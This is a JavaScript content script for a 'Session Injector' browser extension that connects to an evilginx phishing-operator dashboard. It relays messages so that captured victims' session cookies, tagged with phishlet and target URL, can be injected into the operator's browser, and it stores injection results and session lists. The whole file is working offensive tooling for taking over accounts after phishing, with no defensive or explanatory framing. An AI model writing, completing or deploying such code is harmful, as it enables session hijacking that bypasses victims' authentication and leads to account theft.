// Session Injector - content script.
// Runs on pages that identify as an evilginx dashboard (both the operator
// control panel and the per-server dashboard use data-app="ctrl-panel"), and
// bridges dashboard events to the background worker.

(function () {
  if (!document.body || document.body.dataset.app !== 'ctrl-panel') return;

  window.__ctrlExtension = true;
  document.dispatchEvent(new CustomEvent('ext-ready'));
  chrome.storage.local.set({ dashboardConnected: true, dashboardUrl: window.location.origin });
  chrome.runtime.sendMessage({ action: 'dashboard', url: window.location.origin });

  window.addEventListener('unload', function () {
    chrome.storage.local.set({ dashboardConnected: false });
  });

  window.addEventListener('message', function (event) {
    if (event.source !== window || !event.data) return;
    var m = event.data;

    // Take over a session (payload already carries the cookies).
    if (m.type === 'DO_INJECT') {
      chrome.runtime.sendMessage({ action: 'inject', payload: m.payload, mode: m.mode }, function (r) {
        var res = r || {};
        chrome.storage.local.set({
          lastInject: {
            sessionId: m.payload && m.payload.session_id,
            phishlet: m.payload && m.payload.phishlet,
            count: res.success || 0,
            failed: res.failed || 0,
            where: res.where || '',
            error: res.error || '',
            targetUrl: m.payload && m.payload.target_url,
            time: Date.now(),
          },
        });
        window.dispatchEvent(new CustomEvent('inject-result', { detail: res }));
      });
    }

    // Dashboard tells us which row is selected.
    if (m.type === 'SESSION_SELECT') {
      chrome.storage.local.set({ currentSession: m.payload });
    }

    // Dashboard pushed its session list: feeds the badge and auto-open.
    if (m.type === 'SESSIONS') {
      chrome.runtime.sendMessage({ action: 'sessions', list: m.payload || [] });
    }
  });
})();
